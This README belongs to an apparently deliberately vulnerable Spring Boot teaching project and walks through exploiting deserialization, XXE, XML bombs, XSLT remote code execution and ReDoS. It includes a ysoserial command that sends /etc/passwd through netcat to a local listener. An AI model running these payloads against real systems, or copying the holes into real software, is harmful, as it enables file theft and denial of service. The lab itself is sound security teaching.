# Spring Boot - Backend vulnerabilities examples

## Movies with exploitation of:
### [Unsafe Java object deserialization](https://drive.google.com/open?id=1YmJzBR355nG0v9avQdMEbOX7ddq99-N_)
### [XML External Entity (XXE)](https://drive.google.com/open?id=1j6UKJ1fp96cjEh2Cc18N9stsNgGcj2Pg)
### [XML bombs](https://drive.google.com/open?id=1FVg0YzWJyiSPPx3SPB7FBa3iYFuGTgTe)
### [RCE with XSLT](https://drive.google.com/open?id=1rBPmZQQ5y13uCjRMvdu_f0Zi8eKJDuuo)
### [ReDoS](https://drive.google.com/open?id=1_gjB1LlI_IvASfAKtE-eLKBGFIT1Oh_S)

## Run & exploit

### Payloads
Payloads for exploitation can be found in payload folder of the project and its subdirectories.

### Unsafe Java object deserialization
- Generate payload with ysoserial toolkit (https://github.com/frohoff/ysoserial)
`java -jar ysoserial.jar CommonsCollections5 'bash -c {cat,/etc/passwd}|{nc,127.0.0.1,1234}' > serialization_issue.dat`
- Run application
`mvn spring-boot:run`
- Open another terminal and run nc in listen mode:
`nc -l -p 1234`
- Open in browser 'http://localhost:8080/upload-attendee'
- Upload 'serialization_issue.dat' prepared with ysoserial toolkit
- Check terminal with running nc in listen mode to check see content of your /etc/passwd sent by application.

### XML External Entity (XXE)
- Run application
`mvn spring-boot:run`
- Run postman, import collection 'XXE.postman_collection.json' and environment 'local - 8080.postman_environment.json'
- Send request 'Attendee upload xml - XEE' from imported collection
- Check response of server to read /etc/passwd content

### XML bombs
- Run application with additional parameters
`mvn spring-boot:run -Djdk.xml.entityExpansionLimit=0 -Djdk.xml.entityReplacementLimit=0 -Djdk.xml.totalEntitySizeLimit=0`
Note that you turn off upper boundary limits for XML parser. Additional `-Xmx1024m` parameter could be added in case memory would be consumed too quickly.
- Run postman, import collection 'XXE.postman_collection.json' and environment 'local - 8080.postman_environment.json'
- Send request 'Attendee upload xml - XML Bomb' from imported collection
- Monitor usage of CPU and Memory for java process

### RCE with XSLT
- Run application
`mvn spring-boot:run`
- Open another terminal and run nc in listen mode:
`nc -l -p 1234`
- Open in browser 'http://localhost:8080/upload-attendee-xslt'
- Copy payload available in file 'xml_payload_attendee.txt' to field with 'XML' label
- Copy payload available in file 'xslt_payload_attendee.txt' to field with 'XSLT' label
- Press 'Transform button'
- Check terminal with running nc in listen mode to check see content of your /etc/passwd sent by application.

### ReDoS
- Run application
`mvn spring-boot:run`
- Open in browser 'http://localhost:8080/attendeemng'
- Fill in fields 'First Name', 'Last Name' with arbitrary values
- Fill in 'Email' field with multiple 'a' characters eg. 'aaaaaaaaaaaaaaaaaaaaaaaaaa' and press 'Add Attendee'
- Retry addition of attendee with email that has additional 'a' characters until validation doesn't finish in "reasonable" time amount.
